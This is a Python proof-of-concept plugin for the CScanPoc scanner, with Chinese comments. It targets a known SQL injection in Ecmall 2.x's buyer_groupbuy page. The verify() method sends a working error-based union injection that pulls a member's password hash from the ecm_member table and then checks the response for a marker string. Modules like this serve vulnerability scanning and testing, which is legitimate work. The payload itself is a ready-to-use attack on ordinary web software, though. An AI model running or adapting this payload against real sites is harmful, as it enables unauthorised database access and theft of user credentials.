# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Ecmall_0001'  # 平台漏洞编号，留空
    name = 'Ecmall 2.x通杀SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2013-10-24'  # 漏洞公布时间
    desc = '''
        漏洞文件app/buyer_groupbuy.app.php 参数未进行了过滤，达到2.x版本注入。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/811/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Ecmall'  # 漏洞应用名称
    product_version = '2.x'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'ecd06fbd-88e2-4103-a110-7696f9e0d446'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-13'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = '/ecmall/index.php?app=buyer_groupbuy&act=exit_group&id=1 union select 1 from (select count(*),concat(floor(rand(0)*2),(select concat(md5(c),password) from ecm_member limit 0,1))a from information_schema.tables group by a)b'
            url = self.target + payload
            r = requests.get(url)

            if r.status_code == 200 and '4a8a08f09d37b73795649038408b5f33' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
